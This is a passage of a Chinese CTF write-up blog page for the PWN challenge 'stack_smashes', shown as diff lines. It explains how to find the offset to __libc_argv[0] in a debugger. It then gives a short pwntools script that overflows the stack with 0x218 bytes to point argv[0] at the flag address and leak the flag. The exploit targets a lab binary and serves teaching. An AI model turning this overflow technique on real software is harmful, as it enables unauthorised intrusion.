+<p><strong>我们本题需要找__libc_agrc[0]和输入的偏移</strong><br><strong>下断点直接到输入函数</strong><br><img src="/2024/07/18/hello-world/3340174-20240711213242742-1322553195.png" srcset="/img/loading.gif" lazyload><br><strong>第二个参数为输入地址（具体第几个参数，根据函数本身决定）</strong><br><strong>下断点到main</strong><br><img src="/2024/07/18/hello-world/3340174-20240711213804728-1208603033.png" srcset="/img/loading.gif" lazyload><br><strong>__libc_argv[0]指向的是文件路径</strong><br><img src="/2024/07/18/hello-world/3340174-20240711214015987-1913848852.png" srcset="/img/loading.gif" lazyload><br><strong>直接算出偏移</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本也是非常easy</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./stack_smashes&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x000000000040087A&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>flag_addr = <span class="hljs-number">0x0000000000601090</span><br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x218</span> + p64(flag_addr)<br>p.sendafter(<span class="hljs-string">&quot;stack_smashes\n&quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%A0%88/" class="print-no-link">#栈</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/18/hello-world/" title="Hello World">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/18/not-the-same-3dsctf-2016/" title="not_the_same_3dsctf_2016">
+                        <span class="hidden-mobile">not_the_same_3dsctf_2016</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>TKYmax</span></a> <i class="iconfont icon-love"></i> <span>GX</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
